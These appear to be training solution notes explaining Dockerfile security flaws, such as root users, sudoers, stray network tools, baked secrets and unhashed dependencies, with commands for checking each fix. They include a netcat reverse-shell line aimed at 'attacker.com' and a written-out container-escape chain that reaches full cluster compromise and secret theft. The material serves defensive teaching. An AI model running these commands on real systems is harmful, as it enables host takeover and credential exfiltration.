# Phase 01 — Session 01: Solution Notes
## Dockerfile Security — The Why

---

### Why running a container as root is dangerous

Inside a container, UID 0 (root) is the same UID as root on the host kernel. The container boundary is enforced by Linux namespaces and cgroups — not by the UID. If an attacker escapes the container (via a privileged flag, a mounted Docker socket, or a kernel CVE), they exit as root on the host.

When the container runs as UID 1001 (`appuser`), an escape still gives the attacker an unprivileged shell on the host. They must then find a privilege escalation path — an entirely separate step that can be detected, blocked, or simply fail.

The `USER` directive is the single highest-ROI fix in any Dockerfile. It turns a container escape from immediate full host compromise into a constrained unprivileged shell.

```bash
# Verify what UID the container process runs as
docker run --rm <image> id

# Broken image output:   uid=0(root) gid=0(root)
# Hardened image output: uid=1001(appuser) gid=1001(appuser)
```

---

### Why `appuser ALL=(ALL) NOPASSWD:ALL` in sudoers defeats the USER directive

`sudo` grants a process the ability to re-execute as root on demand, without a password. If `appuser` is in sudoers with `NOPASSWD:ALL`, then:

```
attacker gets shell as appuser → sudo su - → root
```

This is root with one extra step. The `USER appuser` in the Dockerfile means nothing if `appuser` can trivially become root. The fix is to never add application users to sudoers. If the app legitimately needs a privileged operation, that is a sign the operation should be extracted into a separate service, a capability, or an init container — not solved with sudo.

**Builder bias callout:** "I added sudo in case the app needs to install something at runtime." If the app needs to install things at runtime, the Dockerfile is wrong — everything needed should be in the image. Runtime package installation is a security and reproducibility problem.

---

### Why `netcat`, `wget`, and `curl` in a production image matters

These tools do not help your application run. They help an attacker operate after they have a foothold:

- `nc` (netcat): `nc -e /bin/bash attacker.com 4444` — one command, interactive reverse shell
- `wget` / `curl`: download a payload, a rootkit, a cryptominer — whatever the attacker wants to run next

Without these, an attacker who gets RCE must find another exfiltration or execution path. That is friction. Not prevention — but friction compounds: every extra step the attacker must take is another opportunity for detection.

The right question before installing any package: "Does the running application need this at runtime?" If no, it should not be in the image.

```bash
# Check what tools are available in a running container
docker run --rm <image> which nc wget curl bash python3
# Each line returned is a tool an attacker can use
```

### Why a hardcoded SSH root password in a Dockerfile is always exposed

Docker images are built in layers. Every `RUN` command creates a layer. `docker history` shows every command that built the image. Even if a secret is deleted in a later layer, it exists in a prior layer — permanently, in the image cache and in any registry it was pushed to.

```bash
# Anyone with access to the image can run this
docker history <image> --no-trunc
# Shows: echo 'root:password123' | chpasswd
# The password is in plain text in the build history
```

Additionally, SSH in a container violates the single-responsibility principle. Containers should be debugged via `kubectl exec` or `docker exec` — not SSH. An SSH daemon is persistent network attack surface that serves no application function.

---

### Why `chmod -R 777 /app` creates a persistence path

`777` means any user and any process on the system can read, write, and execute every file under `/app`. This includes the application source code itself.

If an attacker gets any shell — even as a low-privileged user — they can overwrite `app.py` with a backdoored version. The next time the container restarts, the backdoored code runs as the application. No privilege escalation needed.

```bash
# Test: can a non-owner write to app files?
docker run --rm --user 1002 <image> bash -c "echo 'malicious' >> /app/app.py && echo 'WRITTEN'"
# Broken image:  WRITTEN  (successful write)
# Hardened image: permission denied
```

---

### Why `pip install` without hash verification is a supply chain risk

`pip install -r requirements.txt` without `--require-hashes` fetches whatever version satisfies the constraint at build time. The installed version is not verified cryptographically. Two attack paths exist:

1. **Typosquatting:** attacker registers `requsets` on PyPI. If `requirements.txt` has a typo, the malicious package installs and runs `setup.py` (arbitrary code execution at build time).
2. **Dependency confusion:** if an internal package name is registered on public PyPI, pip prefers the public (attacker-controlled) version.

With `--require-hashes`, every package must have an exact `sha256` hash in `requirements.txt`. Any tampered or wrong package fails the hash check and the build fails immediately.

```bash
# Generate a requirements.txt with hashes
pip-compile --generate-hashes requirements.in -o requirements.txt

# Install with hash enforcement
pip install --require-hashes -r requirements.txt
# A tampered package: ERROR: THESE PACKAGES DO NOT MATCH THE HASHES
```

### Why SSH host keys baked into an image break server authentication

When `openssh-server` is installed, it generates SSH host keys during installation. These keys are the server's identity — what SSH clients use to verify they are talking to the expected server (not an impersonator).

If the image is rebuilt without explicitly regenerating keys, every container from that image shares the same host key. An attacker who records the host key fingerprint from one container can impersonate any other container from the same image without detection by SSH clients.

```
1. Attacker finds SSRF or RCE in the Python app on port 8080

2. Shell is root (Finding: USER root)
   → No privilege escalation needed

3. Check for Docker socket:
   ls -la /var/run/docker.sock
   → If present: docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host
   → Full host filesystem read/write

4. Check for privileged container:
   cat /proc/self/status | grep CapEff
   0000003fffffffff → all capabilities present → privileged
   → mount /dev/sda1 /mnt → host filesystem

5. From host: read kubelet credentials
   cat /etc/kubernetes/pki/... or /var/lib/kubelet/config.yaml
   → kubectl --kubeconfig=stolen-config get nodes
   → access to Kubernetes API as the node

6. From Kubernetes API: create a privileged pod on every node
   → repeat step 3-4 on every node in the cluster

7. Enumerate all pod environment variables across the cluster:
   kubectl exec -n <ns> <pod> -- env | grep -i secret
   → collect all database passwords, API keys, tokens

End state: full cluster compromise, all secrets exfiltrated
```

### Common Mistakes

- **Confusing the `EXPOSE` directive with a firewall rule.** `EXPOSE 22` does not open a port. It documents intent and is used by Docker networking — but the SSH daemon is what actually listens. Removing `EXPOSE 22` without removing `sshd` from `CMD` means SSH still runs; it is just undocumented.

- **Thinking a non-root USER directive is sufficient.** `USER appuser` is meaningless if `appuser` has passwordless sudo. Always check the sudoers file after seeing a `useradd` in a Dockerfile.

- **Assuming base image freshness.** `ubuntu:22.04` resolves to whatever digest is current on Docker Hub at build time. Today's build and tomorrow's build may have different CVE profiles. Pin to a digest (`ubuntu:22.04@sha256:<digest>`) for reproducible security guarantees.

- **Missing build-time secret exposure.** A `RUN echo 'secret' > /app/.env && ... && rm /app/.env` still exposes the secret in the Docker layer. Use `--secret` mounts (BuildKit) to pass secrets at build time without them appearing in any layer.
